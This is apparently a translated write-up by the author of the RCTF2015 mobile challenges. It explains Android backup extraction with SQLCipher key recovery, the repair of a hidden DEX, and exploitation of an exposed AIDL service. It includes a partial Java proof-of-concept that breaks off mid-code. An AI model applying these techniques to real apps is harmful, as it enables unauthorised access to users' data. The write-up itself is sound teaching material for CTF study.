# RCTF2015-Mobile-出题思路及Writeup
|
##### 译文声明
本文是翻译文章，文章来源：Wooyun
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
**@Xbalien ROIS**
从最初CTF上apk的简单反编译到现在各种加固逆向,难度已经上升了好多个级别。但感觉除了ACTF,多数的Mobile题目还是以逆向为主。此  
次作为ROIS成员有幸能参与到RCTF2015的出题工作中,于是尝试了一些新的出题思路,导致大家做题都很不适应,也把大家坑了一波。欢迎建议、意  
见、吐槽。
这次RCTF单独了一个Mobile类别,主题是漏洞,希望和大家一起探讨。
# **0x00 Mobile100-FlagSystem**
> Show me the flag. (The flag should include RCTF{}).
> [ab_2e204fe0ec33b1689f1c47bd60a9770c](https://github.com/Xbalien/RCTF2015-MOBILE/blob/master/FlagSystem/ab_2e204fe0ec33b1689f1c47bd60a9770c)
##
## 出题思路:Android backup漏洞 + 本地密码弱保护
该题给出了一个修改过的backup.ab,稍微需改了ab的头部,version以及compress。直接使用abe进行提取的话需要根据代码简单修复一下ab头部。提取出来后发现有两个备份apk文件。
com.example.mybackup  
com.example.zi
其中mybackup里提供了一个经过sqlcipher加密过的BOOKS.db.该数据库里存储了flag,只要解密该数据库之后即可获取flag。
密码直接可以通过反编译看到:
    public BooksDB(Context context) {
    super(context, "BOOKS.db", null, 1);
    this.k = Test.getSign(context);
    this.db = this.getWritableDatabase(this.k);
    this.dbr = this.getReadableDatabase(this.k);
    }
getSign为自己写的获取签名,然后计算"SHA1",直接利用jeb反编译结果编写代码即可获取key,然后坑点就是要选择尝试正确的sqlcipher版本进行解密即可。
    sqlite> PRAGMA KEY = 'KEY';
    sqlite> .schema
    CREATE TABLE android_metadata (locale TEXT);
    CREATE TABLE books_table (book_id INTEGER primary key autoincrement, book_name t
    ext, book_author text);
    sqlite> select * from books_table
或者利用backup的apk中提供的sqlcipher库进行重写读取数据库也是可以获取到BOOKS.db内容。
#
# **0x01 Mobile200-Where**
> Where is the flag.(The flag should include RCTF{})
> [misc_5b0a7ae29fe01c7a76a19503e1e0273e](https://github.com/Xbalien/RCTF2015-MOBILE/blob/master/Where/misc_5b0a7ae29fe01c7a76a19503e1e0273e)
##
## 出题思路:炸弹引爆 + dex结构修复
该题的定位是杂项题,给了一个apk,但apk啥都没做。在assets目录下存在了一个abc文件,打开后可以看到是损坏的dex header,只要根据dex
header其他相关结构把各id_size都修复。
剩下就是要寻找到隐藏起来的dex
body.参考聚安全博客[[1]](http://jaq.alibaba.com/blog.htm?spm=0.0.0.0.v5UAtC&id=76),我在META-INF目录里隐藏了一个y,并把加密的dex body以及相关加密信息KEY=Misc@inf0#fjhx11.DEX=en(dex
body),aes-128-cbc存放在CERT.RSA尾部,这样一来主apk是能正常安装的。
其实这道题目我描述的不太清楚,坑了一波,所谓的KEY其实只是openssl的-pass,通过KEY生成真正的key以及iv。
通过相关的openssl操作openssl enc -aes-128-cbc -d -k Misc@inf0#fjhx11 -nosalt -in xxx
-out xxx2将dex body解密后与dex header进行拼接,jeb反编译后结果如下:
    public class MainActivity extends ActionBarActivity {
    public String seed;
    public MainActivity() {
    super();
    this.seed = "m3ll0t_yetFLag";
    }
    protected void onCreate(Bundle savedInstanceState) {
    }
    ...
    }
这题我把onCreate方法的code insns扣了出来,查看assembly:
    .method protected onCreate(Bundle)V
          .registers 8
          .param p1, "savedInstanceState"
    00000000  nop
          .prologue
    00000002  nop
    00000004  nop
    00000006  nop
    00000008  nop
    0000000A  nop
    0000000C  nop
    0000000E  nop
    00000010  nop
    00000012  nop
    00000014  nop
    00000016  nop
    00000018  nop
    0000001A  nop
    0000001C  nop
    0000001E  nop
    00000020  nop
          .local v1, strb:Ljava/lang/StringBuilder;
    00000022  nop
通过判断长度可以知道y其实就是扣出来的code insns.直接覆盖在次反编译可以看到onCreate方法中对seed进行了一些修改,最终得到最后flag.
#
# **0x02 Mobile350-Load**
> This APK has a vulnerability,Can you load the flag? Try it.
> [WaWaWa_0bb98521a9f21cc3672774cfec9c7140](https://github.com/Xbalien/RCTF2015-MOBILE/blob/master/Load/WaWaWa_0bb98521a9f21cc3672774cfec9c7140)
##
## 出题思路:暴露组件aidl利用 + next_intent
该题的出题思路是在某次自己参加众测中积累的。该题都在强调Load,通过反编译apk,发现有一个Load类,声明了很多native方法,然后  
WebActivity中调用了一个loadUrl来加载网页。该题本意是通过正确调用的loadUrl,加载flag网址获取flag。
但为了增加逆向难度,APK启动后会检测一下so的调用者,flag放在vps,增加了so-java来回jni交互的逻辑,最后加上了娜迦的so加固。如果真是逆向做出来的,真的是不得不服了。
该题在放出提示exposed component exploit后,复旦六星战队在比赛结束那个时间获得了flag,但最终没有按时提交flag比较遗憾。
Manifest:normal权限保护CoreService,未导出组件WebActivity,导出组件MiscService
WebActivity:通过接收处理一个传递过来的序列化对象,作为Load.decode的参数可以进行flagUrl的解码,之后加载解码后的网页进而获取flag,但该组件未导出.
    public void onCreate(Bundle arg6) {
    super.onCreate(arg6);
    this.setContentView(2130903068);
    this.a = this.findViewById(2131034173);
    this.a.setWebViewClient(new g(this));
    Serializable v0 = this.getIntent().getSerializableExtra("KEY");
    if(v0 == null || !(v0 instanceof b)) {
    Toast.makeText(((Context)this), "flag is null", 1).show();
    }
    else {
    String v1 = ((b)v0).a();
    String v2 = ((b)v0).b();
    if("loading".equals(((b)v0).c())) {
    if(v1 != null && v2 != null) {
    this.a.loadUrl(Load.decode(((Context)this), v1, v2, a.a));
    Toast.makeText(((Context)this), "flag loading ...", 1).show();
    return;
    }
    this.a.loadUrl("file:///android_asset/666");
    }
    }
    }
MiscService:存在next_intent特征,可以控制CLASS_NAME启动组件
    public Intent a(Intent arg4) {
    Intent v0 = new Intent();
    v0.setClassName(this.getApplicationContext(), arg4.getStringExtra("CLASS_NAME"));
    v0.putExtras(arg4);
    v0.setFlags(268435456);
    return v0;
    }
CoreService:存在暴露的AIDL接口,多处使用了Load的native方法。
    class b extends a {
    b(CoreService arg1) {
    this.a = arg1;
    super();
    }
    public String a() throws RemoteException {
    c v0 = new c(Load.getUrl(this.a), Load.getToken(this.a));
    Thread v1 = new Thread(((Runnable)v0));
    v1.start();
    try {
    v1.join();
    }
    catch(InterruptedException v1_1) {
    v1_1.printStackTrace();
    }
    return v0.a();
    }
    public String b() throws RemoteException {
    return null;
    }
    public String c() throws RemoteException {
    return Load.getIv(this.a);
    }
    }
因此,通过仔细分析及猜测逻辑,这个核心服务提供了两个接口:  
一个接口通过调用Load的native函数getUrl以及getToken,获取vps-url以及token参数,post到vps-url,若  
token正确即可获取key. 另一个接口通过Load.getIv自己本地获取了iv.  
因此通过直接利用该暴露了aidl接口可以轻松获得des解密需要的key和iv.
POC如下:
    protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_bind);
    try {
    ComponentName com = new ComponentName("com.example.wawawa", "com.example.wawawa.CoreService"); 
    Intent intent = new Intent();
    intent.setComponent(com);
    bindService(intent, connD, Context.BIND_AUTO_CREATE);
    } catch (Exception e) {
    }
    }
    private d da;
    private ServiceConnection connD = new ServiceConnection() {
    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
    da = d.Stub.asInterface(service);
    try {
    System.out.println(da.c());
    System.out.println(da.a());
    } catch (RemoteException e) {
    e.printStackTrace();